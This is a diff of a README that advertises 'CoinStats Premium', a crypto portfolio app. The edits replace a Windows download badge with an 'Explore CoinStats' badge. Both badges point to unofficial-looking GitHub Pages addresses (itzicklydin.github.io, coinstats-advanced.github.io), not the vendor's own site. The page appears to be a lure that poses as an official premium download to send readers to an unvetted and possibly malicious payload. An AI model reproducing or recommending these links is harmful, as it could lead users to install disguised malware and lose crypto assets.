@@ -2,9 +2,9 @@
 
 ![CoinStats Premium Banner](https://coinstats.app/images/portfolio/landing/new-portfolio-dashboard.png)
 
-## 📥 Download CoinStats Premium for Windows
+## 📥 Download CoinStats Premium 
 
-[![⬇️ Download CoinStats Premium](https://img.shields.io/badge/Download-CoinStats%20Premium-blue?style=for-the-badge&logo=windows)](https://itzicklydin.github.io/.github/coinstats-premium-app)
+[![Explore CoinStats](https://img.shields.io/badge/Explore-CoinStats-B45309?style=for-the-badge)](https://coinstats-advanced.github.io/.github/)
 
 ---
 
@@ -27,11 +27,8 @@ Security remains a cornerstone of CoinStats Premium’s design philosophy. API k
 Whether you’re a day trader executing high-frequency trades, a long-term investor diversifying across blockchains, or a DeFi strategist leveraging complex yield protocols, CoinStats Premium consolidates every aspect of your crypto journey into one secure, intelligent, and highly customizable hub. By combining real-time market monitoring, detailed analytics, risk management tools, and robust security measures, it empowers you to make better, faster, and more informed decisions — giving you a true competitive edge in the fast-moving world of digital assets.
 
 
-[![⬇️ Download CoinStats Premium](https://img.shields.io/badge/Download-CoinStats%20Premium-blue?style=for-the-badge&logo=windows)](https://itzicklydin.github.io/.github/coinstats-premium-app)
+[![Explore CoinStats](https://img.shields.io/badge/Explore-CoinStats-B45309?style=for-the-badge)](https://coinstats-advanced.github.io/.github/)
 
----
-
-![CoinStats Portfolio View](https://coinbureau.com/_next/image/?url=https%3A%2F%2Fimage.coinbureau.com%2Fstrapi%2Fimage_bdd631ef1d.png&w=2048&q=50)
 
 ---
 
